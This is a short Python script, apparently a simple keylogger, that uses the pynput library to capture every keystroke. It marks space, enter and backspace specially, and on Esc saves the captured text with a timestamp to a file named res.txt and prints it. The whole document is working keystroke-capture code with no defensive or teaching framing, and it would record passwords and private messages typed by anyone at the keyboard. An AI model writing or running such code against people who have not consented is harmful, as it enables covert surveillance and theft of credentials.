from time import sleep
from pynput import keyboard
from datetime import datetime

global typed
global final_chars

typed = []
final_chars = ""

#write string of text to a file

def write_to_file():
    global final_chars
    global typed
    
    # time
    now = str(datetime.now())
    
    #Join the list and convert to a string
    final_chars = "".join(map(str, typed))
    final_chars = final_chars.replace("''", "") 
    final_chars = final_chars+" -------- date and time : "+now 
    
    f = open("res.txt", "w")
    f.write(str(final_chars))
    f.close() 

#output from file logs

def output():
	f = open("res.txt","r")
	print("\n")
	print(f.read())
	
#read key input    
def on_press(key):
    global typed
    
    key = str(key)
    
    if key == str("Key.space"): # checks for spacebar
        key = (" ")
    elif key == str("Key.enter"): # checks for enter
        key = (" '||' ")
    elif key == str("Key.backspace"): # checks for backspace
        key = (" '<-' ")
    elif key == str("Key.esc"): # checks for esc
        key = ("")
    typed.append(str(key))
    
def on_release(key):
    if str(key) == 'Key.esc':
        write_to_file()
        output()
        return False

with keyboard.Listener(on_press = on_press,on_release = on_release) as listener:
    listener.join()
